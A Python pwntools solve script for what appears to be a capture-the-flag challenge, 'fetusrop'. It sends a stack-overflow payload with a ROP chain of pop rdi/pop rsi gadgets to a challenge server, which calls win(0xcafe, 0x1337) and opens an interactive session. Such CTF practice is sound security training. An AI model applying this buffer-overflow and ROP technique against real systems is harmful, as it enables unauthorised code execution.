from pwn import *

SERVER = "challs1.nusgreyhats.org"
PORT = 5011

# p = process('./fetusrop')
p = remote(SERVER, PORT)

elf = ELF('./fetusrop')

# ROPgadget --binary fetusrop | grep 'pop rdi'
# 0x00000000004005f3 : pop rdi ; ret
poprdi = 0x4005f3 # for first argument

# ROPgadget --binary fetusrop | grep 'pop rsi'
# 0x00000000004005f1 : pop rsi ; pop r15 ; ret
poprsi = 0x4005f1 # for second argument

# ROPgadget --binary fetusrop | grep 'ret'
# 0x0000000000400416 : ret
ret = 0x400416

a = 0xcafe
b = 0x1337

win = elf.sym.win

buf = b'a'*(32 + 8)

# goal: call win(a, b)
payload = buf
# payload += p64(ret)
payload += p64(poprdi) + p64(a)
payload += p64(poprsi) + p64(b) + p64(0xaa)
payload += p64(win)

## Attach debugger
# gdb.attach(p)
# pause()

p.sendline(payload)
p.interactive()
